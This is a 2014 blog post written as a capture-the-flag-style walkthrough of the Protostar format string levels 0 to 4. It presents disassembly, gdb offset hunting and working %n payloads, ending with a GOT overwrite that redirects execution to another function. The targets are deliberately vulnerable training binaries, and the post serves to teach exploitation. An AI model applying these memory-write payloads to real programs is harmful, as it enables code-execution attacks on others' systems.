<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta itemprop="name" content="Exploit Exercises - Protostar - Format String levels">
  <title>Exploit Exercises - Protostar - Format String levels</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta itemprop="description" content="Exploit Exercises&#39; Protostar wargame includes a number of carefully prepared binary exploitation exercises. This is a write up for the format string exploitation.">

  
  <meta itemprop="keywords" content="exploit exercises, protostar, challenge" />
  
    <meta itemprop="wordCount" content="1301">
  

  <meta property="og:title" content="Exploit Exercises - Protostar - Format String levels" />
  <meta property="og:description" content="This is my personal blog to keep track of stuff I am doing after hours." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="http://camelinc.info/blog/2014/09/Exploit-Exercises---Protostar---Format-String-levels/" />
  

  
  <meta property="og:updated_time" content="2014-09-16 13:21:27 &#43;0000 UTC"/>
  
  
  
  

  
    <meta name="twitter:card" content="summary"/>
  

  
  <meta name="twitter:title" content="Exploit Exercises - Protostar - Format String levels"/>
  <meta name="twitter:description" content="This is my personal blog to keep track of stuff I am doing after hours."/>
  
  

  
  
  <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
  <link href="http://camelinc.info//css/hc.css" rel="stylesheet">

  
  <link rel="stylesheet" href="http://camelinc.info//css/zenburn.css" type="text/css" media="screen" />

  

  
  <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">

  <meta name="generator" content="Hugo 0.37.1" />
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  
  
</head>


  <body>

  
<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
  <div id = "wrapper">

<div class="navbar navbar-default" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
        </div>

        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
					
          <h2>http://camelinc.info/</h2>
					
					<li><a href="http://camelinc.info/about">About </a></li>
					
					<li><a href="http://camelinc.info/post">Posts </a></li>
					
          </ul>
        </div>
      </div>
    </div>

       
       <div id="sidebar-wrapper">
        <ul class="sidebar-nav">
					<img src="/img/avatar.png" />
          <li class="sidebar-brand"><a href="http://camelinc.info//"><h1 class="brand">camelinc</h1></a><h3>This is my personal blog to keep track of stuff I am doing after hours.</h3></li>
          <hr />

					
						<li><a href="http://camelinc.info/about">About </a></li>
					
						<li><a href="http://camelinc.info/post">Posts </a></li>
					
          <hr />

          <div id="social-wrapper">
           
             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
           

           
             
           

           
             
           

           
             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
           
         </div>

       </ul>
     </div>

     <div class="container">


  <div id="article">
    <div class="article-title">Exploit Exercises - Protostar - Format String levels</div>
    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-09-16</small></p> <hr/>
    <div class="post">
      

<h1 id="prequisites">Prequisites</h1>

<ul>
<li><a href="http://download.exploit-exercises.com/exploit-exercises-protostar-2.iso">Protostar ISO</a></li>
</ul>

<h1 id="format-0">Format 0</h1>

<p>First of all, we take a look at the disassembly.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x08048431 &lt;main+6&gt;:    sub    $0x10,%esp
0x08048434 &lt;main+9&gt;:    mov    0xc(%ebp),%eax    ; load pointer to the address of first argument
0x08048437 &lt;main+12&gt;:   add    $0x4,%eax         ; increment to get to the pointer of the second argument
0x0804843a &lt;main+15&gt;:   mov    (%eax),%eax       ; resolve pointer-pointer
0x0804843c &lt;main+17&gt;:   mov    %eax,(%esp)       ; store at adress of esp
0x0804843f &lt;main+20&gt;:   call   0x80483f4 &lt;vuln&gt;
...
0x080483fa &lt;vuln+6&gt;:    movl   $0x0,-0xc(%ebp)
0x08048401 &lt;vuln+13&gt;:   mov    0x8(%ebp),%eax
0x08048404 &lt;vuln+16&gt;:   mov    %eax,0x4(%esp)
0x08048408 &lt;vuln+20&gt;:   lea    -0x4c(%ebp),%eax         ; load address of target buffer
0x0804840b &lt;vuln+23&gt;:   mov    %eax,(%esp)              ; load address of second argument
<span class="hl">0x0804840e &lt;vuln+26&gt;:   call   0x8048300 &lt;sprintf@plt&gt;
</span>0x08048413 &lt;vuln+31&gt;:   mov    -0xc(%ebp),%eax
0x08048416 &lt;vuln+34&gt;:   cmp    $0xdeadbeef,%eax
0x0804841b &lt;vuln+39&gt;:   jne    0x8048429 &lt;vuln+53&gt;
0x0804841d &lt;vuln+41&gt;:   movl   $0x8048510,(%esp)
0x08048424 &lt;vuln+48&gt;:   call   0x8048330 &lt;puts@plt&gt;
...</code></pre></div>

<p>So this program takes a startup argument.
This input is then utilized in the sprintf at 0x0804840e.
So to exploit this sample we have to perform a format string attack.
The format string variable is located at EBP-0x4c.
The variable for the challenge relevant comparison is located at EBP-0xc.
So we need to write 64 bytes to align the payload of 0xdeadbeef.
To write 64 bytes the format string expression %64x will suffice.
Finally, we can complete the level with the following command.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ /opt/protostar/bin/format0 $(python -c &#39;print &#34;%64x&#34;+ &#34;\xef\xbe\xad\xde&#34;&#39;)
you have hit the target correctly :)</code></pre></div>

<h1 id="format-1">Format 1</h1>

<p>In this scenario we have to manipulate a specific location on the heap.
Let&rsquo;s examine the vuln function to get a better idea.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x080483fa &lt;vuln+6&gt;:    mov    eax,DWORD PTR [ebp+0x8]
0x080483fd &lt;vuln+9&gt;:    mov    DWORD PTR [esp],eax
0x08048400 &lt;vuln+12&gt;:   call   0x8048320 &lt;printf@plt&gt;
<span class="hl">0x08048405 &lt;vuln+17&gt;:   mov    eax,ds:0x8049638
</span>0x0804840a &lt;vuln+22&gt;:   test   eax,eax
0x0804840c &lt;vuln+24&gt;:   je     0x804841a &lt;vuln+38&gt;
0x0804840e &lt;vuln+26&gt;:   mov    DWORD PTR [esp],0x8048500
0x08048415 &lt;vuln+33&gt;:   call   0x8048330 &lt;puts@plt&gt;
...</code></pre></div>

<p>The location in question is 0x08049638.
The variable is located in the .data section, indicating a global variable.</p>

<p>Like the previous example the user can supply an argument for printf.
This type of printf vulnerability allows direct parameter access.
To overwrite the target we have to find the correct offset to skip.
We can calculate rough estimate by looking at the following addresses.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) x/4x $esp
0xbffff5f0:     0xbffff843      0x0804960c      0xbffff628      0x08048469
(gdb) x/2s 0xbffff843
0xbffff843:      &#34;AAAA&#34;</code></pre></div>

<p>The required offset will be at round 0x141 bytes (0xbffff843 - 0xbffff5f0).
This makes for about 149 words to skip.
To get an exact number we can utilize the following command.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/opt/protostar/bin$ /opt/protostar/bin/format1 $(python -c &#39;print &#34;AAAA&#34;+&#34;.&#34;.join([&#34;%d:%%x&#34; % i for i in range(1,150)])&#39;)
... 143:74616d72.144:41410031.145:3a314141.146:322e7825 ...</code></pre></div>

<p>So the address is aligned between words 144 and 145.
With an alignment we have identified the correct offset.
The respective command to complete the level is as follows.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ //opt/protostar/bin/format1 $(python -c &#39;print &#34;\x38\x96\x04\x08%144$n&#34;&#39;)</code></pre></div>

<h1 id="format-2">Format 2</h1>

<p>This example is based on the previous level 1.
First, we will take a look at the relevant parts of the assembly.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x0804846e &lt;vuln+26&gt;:   lea    -0x208(%ebp),%eax
0x08048474 &lt;vuln+32&gt;:   mov    %eax,(%esp)
0x08048477 &lt;vuln+35&gt;:   call   0x804835c &lt;fgets@plt&gt;
0x0804847c &lt;vuln+40&gt;:   lea    -0x208(%ebp),%eax
0x08048482 &lt;vuln+46&gt;:   mov    %eax,(%esp)
0x08048485 &lt;vuln+49&gt;:   call   0x804837c &lt;printf@plt&gt;
0x0804848a &lt;vuln+54&gt;:   mov    0x80496e4,%eax
0x0804848f &lt;vuln+59&gt;:   cmp    $0x40,%eax
0x08048492 &lt;vuln+62&gt;:   jne    0x80484a2 &lt;vuln+78&gt;
...</code></pre></div>

<p>Once again, we have to calculate the correct offset.
For the estimate we take a look at the stack during runtime.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) x/2x $esp
0xbffff410:     0xbffff420      0x00000200
(gdb) x/2s 0xbffff420
0xbffff420:      &#34;aaa\n&#34;
0xbffff425:      &#34;&#34;</code></pre></div>

<p>This makes for an offset of 0x10 bytes.
We calculate the exact offset with previously discussed the method.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ python -c &#39;print &#34;AAAA&#34;+&#34;.&#34;.join([&#34;%d:%%x&#34; % i for i in range(1,10)])&#39; | /opt/protostar/bin/format2
AAAA1:200.2:b7fd8420.3:bffff464.4:41414141.5:78253a31.6:253a322e.7:3a332e78.8:342e7825.9:2e78253a
target is 0 :(</code></pre></div>

<p>Now we only need to go back 4 words to access to desired memory location.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/opt/protostar/bin$ python -c &#39;print &#34;\xe4\x96\x04\x08%4$n&#34;&#39; | /opt/protostar/bin/format2

target is 4 :(</code></pre></div>

<p>The problem is, that we still need to set the value to 0x40.
In fact printf stores the number of written bytes at the target offset.
So we simply increase output size and voila:</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/opt/protostar/bin$ python -c &#39;print &#34;\xe4\x96\x04\x08%52x%x%4$n&#34;&#39; | /opt/protostar/bin/format2
                                                 200b7fd8420
you have modified the target :)</code></pre></div>

<h1 id="format-3">Format 3</h1>

<p>This example is once again based on the previous level.
Let&rsquo;s examine the changes in assembly for starters.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x0804845a &lt;printbuffer+6&gt;:     mov    0x8(%ebp),%eax
0x0804845d &lt;printbuffer+9&gt;:     mov    %eax,(%esp)
0x08048460 &lt;printbuffer+12&gt;:    call   0x804837c &lt;printf@plt&gt;
...
0x08048475 &lt;vuln+14&gt;:   mov    %eax,0x8(%esp)
0x08048479 &lt;vuln+18&gt;:   movl   $0x200,0x4(%esp)
0x08048481 &lt;vuln+26&gt;:   lea    -0x208(%ebp),%eax
0x08048487 &lt;vuln+32&gt;:   mov    %eax,(%esp)
0x0804848a &lt;vuln+35&gt;:   call   0x804835c &lt;fgets@plt&gt;
0x0804848f &lt;vuln+40&gt;:   lea    -0x208(%ebp),%eax
0x08048495 &lt;vuln+46&gt;:   mov    %eax,(%esp)
0x08048498 &lt;vuln+49&gt;:   call   0x8048454 &lt;printbuffer&gt;
0x0804849d &lt;vuln+54&gt;:   mov    0x80496f4,%eax
0x080484a2 &lt;vuln+59&gt;:   cmp    $0x1025544,%eax
0x080484a7 &lt;vuln+64&gt;:   jne    0x80484b7 &lt;vuln+80&gt;
...</code></pre></div>

<p>The fgets() call is restricted with a length restriction.
Also, the printf() function is encapsulated in a function call.
Finally, to complete the level the the global variable at 0x080496f4 has to be manipulated.
The value has to be set to 0x01025544.</p>

<p>We try to narrow down the correct offset to access the target memory location.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) x/2x $esp
0xbffff3f0:     0xbffff420      0x00000000
(gdb) x/4s 0xbffff420
0xbffff420:      &#34;aaaa%x\n&#34;
0xbffff428:      &#34;$\365\377\267&#34;</code></pre></div>

<p>This makes for an offset of 0x10 bytes.
We calculate the exact offset with previously discussed the method.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ python -c &#39;print &#34;AAAA&#34;+&#34;.&#34;.join([&#34;%d:%%x&#34; % i for i in range(1,15)])&#39;`&#34; | /opt/protostar/bin/format3
AAAA1:0.2:bffff420.3:b7fd7ff4.4:0.5:0.6:bffff628.7:804849d.8:bffff420.9:200.10:b7fd8420.11:bffff464.12:41414141.13:78253a31.14:253a322e
target is 00000000 :(</code></pre></div>

<p>So the respective command to overwrite the target buffer is as follows.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ python -c &#39;print &#34;\xf4\x96\x04\x08&#34;+&#34;%12$n&#34;&#39; | /opt/protostar/bin/format3

target is 00000004 :(</code></pre></div>

<p>The required value in the target buffer cannot be set with one write operation.
The simplest way is to set every byte seperatly.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ python -c &#39;print &#34;\xf4\x96\x04\x08&#34;+&#34;\xf5\x96\x04\x08&#34;+&#34;\xf6\x96\x04\x08&#34;+&#34;\xf7\x96\x04\x08&#34;+&#34;%01x%12$n&#34;+&#34;%17x%13$n&#34;+&#34;%17x%14$n&#34;+&#34;%17x%15$n&#34;&#39; | /opt/protostar/bin/format3
���0         bffff420         b7fd7ff4                0
target is 44332211 :(</code></pre></div>

<p>Now we just have to adjust every offset to match the desired value.
To do this, we adjust the printed bytes before every write to memory.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ python -c &#39;print &#34;\xf4\x96\x04\x08&#34;+&#34;\xf5\x96\x04\x08&#34;+&#34;\xf6\x96\x04\x08&#34;+&#34;\xf7\x96\x04\x08&#34;+&#34;%52x%12$n&#34;+&#34;%17x%13$n&#34;+&#34;%173x%14$n&#34;+&#34;%255x%15$n&#34;&#39; | /opt/protostar/bin/format3
...
you have modified the target :)</code></pre></div>

<h1 id="format-4">Format 4</h1>

<p>For this exercise we have to manipulation the execution flow.
In partiuclar, we have to execute the hello() function at 0x080484b4.
The assembly directly points out where we have to start working.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x080484b4 &lt;hello+0&gt;:   push   ebp
0x080484b5 &lt;hello+1&gt;:   mov    ebp,esp
0x080484b7 &lt;hello+3&gt;:   sub    esp,0x18
0x080484ba &lt;hello+6&gt;:   mov    DWORD PTR [esp],0x80485f0
0x080484c1 &lt;hello+13&gt;:  call   0x80483dc &lt;puts@plt&gt;
0x080484c6 &lt;hello+18&gt;:  mov    DWORD PTR [esp],0x1
0x080484cd &lt;hello+25&gt;:  call   0x80483bc &lt;_exit@plt&gt;
...
0x080484db &lt;vuln+9&gt;:    mov    eax,ds:0x8049730
0x080484e0 &lt;vuln+14&gt;:   mov    DWORD PTR [esp+0x8],eax
0x080484e4 &lt;vuln+18&gt;:   mov    DWORD PTR [esp+0x4],0x200
0x080484ec &lt;vuln+26&gt;:   lea    eax,[ebp-0x208]
0x080484f2 &lt;vuln+32&gt;:   mov    DWORD PTR [esp],eax
0x080484f5 &lt;vuln+35&gt;:   call   0x804839c &lt;fgets@plt&gt;
0x080484fa &lt;vuln+40&gt;:   lea    eax,[ebp-0x208]
0x08048500 &lt;vuln+46&gt;:   mov    DWORD PTR [esp],eax
0x08048503 &lt;vuln+49&gt;:   call   0x80483cc &lt;printf@plt&gt;
0x08048508 &lt;vuln+54&gt;:   mov    DWORD PTR [esp],0x1
0x0804850f &lt;vuln+61&gt;:   call   0x80483ec &lt;exit@plt&gt;</code></pre></div>

<p>So we have to manipulate the final call to exit().
Let&rsquo;s examine the respective instructions.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) x/i $eip
0x804850f &lt;vuln+61&gt;:    call   0x80483ec &lt;exit@plt&gt;
(gdb) x/3i 0x80483ec
0x80483ec &lt;exit@plt&gt;:   jmp    DWORD PTR ds:0x8049724
0x80483f2 &lt;exit@plt+6&gt;: push   0x30
0x80483f7 &lt;exit@plt+11&gt;:        jmp    0x804837c
(gdb) x/x 0x8049724
0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;:   0x080483f2</code></pre></div>

<p>We have to write the target address of hello() to 0x08049724.
First, we identify the offset for our address.
This time we use gdb to do just that.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) x/12x $esp
0xbffff410:     0xbffff420      0x00000200      0xb7fd8420      0xbffff464
0xbffff420:     0x61616161      0x0000000a      0xb7fff524      0x00000000
0xbffff430:     0xb7fff524      0xbffff4c0      0xb7fe35c9      0x00000007</code></pre></div>

<p>We already had the address of the target buffer.
Also, the desired value for the target buffer is clear.
With an offset of 4 we now can continue.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/opt/protostar/bin$ python -c &#39;print &#34;\x24\x97\x04\x08&#34;+ &#34;\x25\x97\x04\x08&#34;+ &#34;\x26\x97\x04\x08&#34;+ &#34;\x27\x97\x04\x08&#34;+ &#34;%164x%4$n&#34;+ &#34;%208x%5$n&#34;+ &#34;%128x%6$n&#34;+ &#34;%4c%7$n&#34;&#39; | /opt/protostar/bin/format4
...
code execution redirected! you win</code></pre></div>

<p>With the reuse of the existing address we can optimze the size.
To do this, we have to utilize the short write <strong>hf</strong> for printf.
This reduces the overall length of the command to complete this exercise.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/opt/protostar/bin$ python -c &#39;print &#34;\x24\x97\x04\x08&#34;+ &#34;%33968c%4$hn&#34;&#39; | /opt/protostar/bin/format4
...
code execution redirected! you win</code></pre></div>

<h1 id="links-and-references">Links and References</h1>

<h2 id="exploit-exercises">Exploit Exercises</h2>

<ul>
<li><a href="http://exploit-exercises.com/protostar">exploit-exercises.com - Protostar</a></li>
<li><a href="https://thesprawl.org/research/exploit-exercises-protostar-format/">TheSprawl - protostar - format string levels</a></li>
<li><a href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/">Louis Li</a></li>
<li><a href="https://code.google.com/p/protostar-solutions/">Exploit exercises protostar</a></li>
<li><a href="https://www.mattandreko.com/categories/protostar/">MattAndreko: Protostar</a></li>
</ul>

<h2 id="return-oriented-programming">Return-oriented Programming</h2>

<ul>
<li><a href="http://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf">Exploiting Format String Vulnerabilities</a></li>
</ul>

<h2 id="other">Other</h2>

<ul>
<li><a href="http://unix.stackexchange.com/questions/15531/how-come-no-core-dump-is-create-when-an-application-has-suid-set">Core dump suid binaries</a></li>
</ul>

    </div>
  </div>

  <ul class="pager">
    

    
      
        &nbsp;<li class="previous"><a href="http://camelinc.info/blog/2014/09/Exploit-Exercises---Protostar---Network-levels/"> Exploit Exercises - Protostar - Network levels</a></li>
      
    
    
      
        &nbsp;<li class="next"><a href="http://camelinc.info/blog/2014/08/Exploit-Exercises---Protostar---Stack-levels/"> Exploit Exercises - Protostar - Stack levels</a></li>
      
    
  </ul>



<footer>

  <p class="text-muted credit">&copy; 2018. All rights reserved. </p>

  
  

  <script type="text/javascript" src="http://camelinc.info//js/jquery-2.1.4.js"></script>

  <script src="http://camelinc.info//js/bootstrap.min.js"></script>
  <script src="http://camelinc.info//js/bootstrap.js"></script>
  <script type="text/javascript" src="http://camelinc.info//js/hc.js"></script>

  
  <script type="text/javascript" src="http://camelinc.info//lightbox/js/lightbox.js"></script>
  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', "UA-83225898-1", 'auto');
    ga('send', 'pageview');
  </script>
  

  

</footer>

	</body>
</html>
